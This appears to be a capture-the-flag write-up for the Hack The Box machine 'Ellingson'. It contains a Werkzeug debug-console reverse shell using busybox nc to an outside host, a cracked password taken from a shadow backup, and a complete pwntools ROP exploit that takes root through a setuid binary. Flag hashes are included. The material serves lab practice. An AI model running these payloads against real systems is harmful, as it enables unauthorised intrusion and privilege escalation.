```json
Alias: Ellingson
Date: 06-06_2025
Platform: Hackthebox
OS: Linux
Difficulty: Hard
Status: Complete
IP: 10.10.10.139
```

# Ellingson
# Summary

- Placeholder

# Used Tools

* Placeholder
 
---

# Information Gathering
## NMAP
```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-06 19:39 PKT
Nmap scan report for 10.10.10.139
Host is up (0.13s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT     STATE    SERVICE VERSION
22/tcp   open     ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 49:e8:f1:2a:80:62:de:7e:02:40:a1:f4:30:d2:88:a6 (RSA)
|   256 c8:02:cf:a0:f2:d8:5d:4f:7d:c7:66:0b:4d:5d:0b:df (ECDSA)
|_  256 a5:a9:95:f5:4a:f4:ae:f8:b6:37:92:b8:9a:2a:b4:66 (ED25519)
80/tcp   open     http    nginx 1.14.0 (Ubuntu)
| http-title: Ellingson Mineral Corp
|_Requested resource was http://10.10.10.139/index
|_http-server-header: nginx/1.14.0 (Ubuntu)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 45.19 seconds
```
## Discovered Subdomains
```
best.test.com
```

---
# Enumeration
## Port 80 - HTTP

Running a flask application which can view articles by visiting endpoints `/article/1` or 2 or 3. Replacing the id with a string will cause a error page `/article/'`

---

# Exploitation

Debug page can run arbitrary python code if we click the console icon next to the stack traces. Get a reverse shell.

```python
[console ready]

>>> import os

>>> os.system("busybox nc 10.10.14.99 4444 -e sh")
```

---

# Lateral Movement

We get a shell as `hal` who is part of the `adm` group, looking at files we can read as  part of `adm`

```bash
find / -group adm 2>/dev/null 
```

We see an interesting file.

```
/var/backup/shadow.bak
```

Retrieving this and cracking with john we find the password for `theplague` which doesn't work. We also find the password for `margo`

| Username | Password  |
| -------- | --------- |
| margo    | iamgod$08 |


---

# Privilege Escalation

Margo can run the binary `/usr/bin/garbage` as root due to setuid bit. The next part requires some binary exploitation, which is hard to follow along without previous experience. So learn a bit more about it if you're having trouble understanding and come back.

After download the binary and viewing it in ghidra, I first did a `checksec` on it to see what security measures are implemented and `NXStack` is enabled. This means we can't directly run code on the stack.

The interesting function in the file is `auth()`. It's vulnerable to a buffer overflow

```c
bool auth(__uid_t uid)

{
  int pwdComparision;
  char password [100];
  char username [12];
  __uid_t uid_;
  
  uid_ = uid;
  strcpy(username,::username);
  printf("Enter access password: ");
  gets(password);
  putchar('\n');
  pwdComparision = strcmp(password,"N3veRF3@r1iSh3r3!");
  if (pwdComparision != 0) {
    puts("access denied.");
  }
  else {
    strcat((char *)&local_f8,username);
    syslog(6,(char *)&local_f8);
    puts("access granted.");
  }
  return pwdComparision == 0;
}
```

I removed some unnecessary stuff and renamed variables to make it more readable. Also, if you have a different `uid` than 1002 then this won't run since there is a `check_user` function that validates that. If your `uid` is 1002 already then go ahead.

Mine was `1000` so I first in ghidra navigated to the assembly instruction that performed the cmp, and changed `1002` to `1000`. Then `File -> Export Program -> Original File`.

Now, coming back to the `auth` function, we see that the `gets` function is used to read data in password, which doesn't enforce a limit. So we can overwrite the stack variables, including RBP (these lie above on the stack). So when the function is returned, it get's returned to code of our choice rather than `main`. Usually, we would put shellcode on the stack and make the RBP point to the stack to run our shellcode.

We can't do that since the stack is non executable `NXStack`. So we will use a method called Return Oriented Programming (ROP) where we find convenient instructions in the binary such as `pop rdx; ret` all these instructions end with `ret` which causes the control flow to come back and take the next address from the stack as well. It's very hard to explain here but `liveoverflow` has a great video explaining ROP on his channel.

Using `pwndbg`, I create a cyclic pattern of around 170 bytes and when it asks for the password, I input the pattern

```bash
pwngdb
file garbage
cyclic 170 pattern
r < pattern
```

The program will crash with the return address being overflown with the value `0x6161616161616172`. We can then ask `cyclic` what is the offset where this pattern occurs

```bash
cyclic -l 0x6161616161616172
```

Found at offset 136, Meaning from the start of the password buffer to the return address on the stack is 136 bytes. We have to create a gadget chain of under this size. This includes calling `setuid` function to actually change our `uid` to root, then calling `system` to start `/bin/sh` or something

This is the final exploit

```python
import pwn

pwn.context.terminal = ['tmux', 'new-window']
pwn.context(os="linux", arch="amd64")
s = pwn.ssh(host = "10.10.10.139", user = "margo", password = "iamgod$08")
target = s.process("/usr/bin/garbage") 

skip = b"A" * 136

# Addresses in `garbage` binary
puts_plt = pwn.p64(0x401050) # call puts
puts_got = pwn.p64(0x404028) # puts Global offset table addr
pop_rdi = pwn.p64(0x40179b)  # pop rdi; ret
main = pwn.p64(0x401619)     # main function address 

# Addresses in libc.6.so
libc_puts_offset = pwn.p64(0x809c0)
libc_setuid_offset = pwn.p64(0xe5970)
libc_system_offset = pwn.p64(0x4f440)
libc_sh_offset = pwn.p64(0x1b3e9a) # Points to the string "/bin/sh"

# Leak Address
gadget = skip + pop_rdi + puts_got + puts_plt + main # Call puts with puts as it's argument to leak address of libc (since puts is in libc)

target.sendline(gadget)
target.recvuntil(b"access denied.")

leaked_puts = pwn.u64(target.recv()[:8].strip().ljust(8, b'\x00'))
libc_base = leaked_puts - pwn.u64(libc_puts_offset)
setuid_addr = pwn.p64(libc_base + pwn.u64(libc_setuid_offset))
system_addr = pwn.p64(libc_base + pwn.u64(libc_system_offset))
sh_addr = pwn.p64(libc_base + pwn.u64(libc_sh_offset))

pwn.log.info(f"Leaked puts address: {hex(leaked_puts)}")
pwn.log.info(f"libc address: {hex(libc_base)}")
pwn.log.info(f"Leaked setuid address: {hex(pwn.u64(setuid_addr))}")
pwn.log.info(f"Leaked system address: {hex(pwn.u64(system_addr))}")

# Gain code execution
gadget = skip + pop_rdi + pwn.p64(0) + setuid_addr + pop_rdi + sh_addr + system_addr
target.sendline(gadget)

target.interactive()
```


![[Pasted image 20250607201412.png]]


---

# Flags
- 46f54636b26b63801350bad3c0fd717c
- d5c25d0ddf84bd72f6d6a1b60084ffaf

#CTF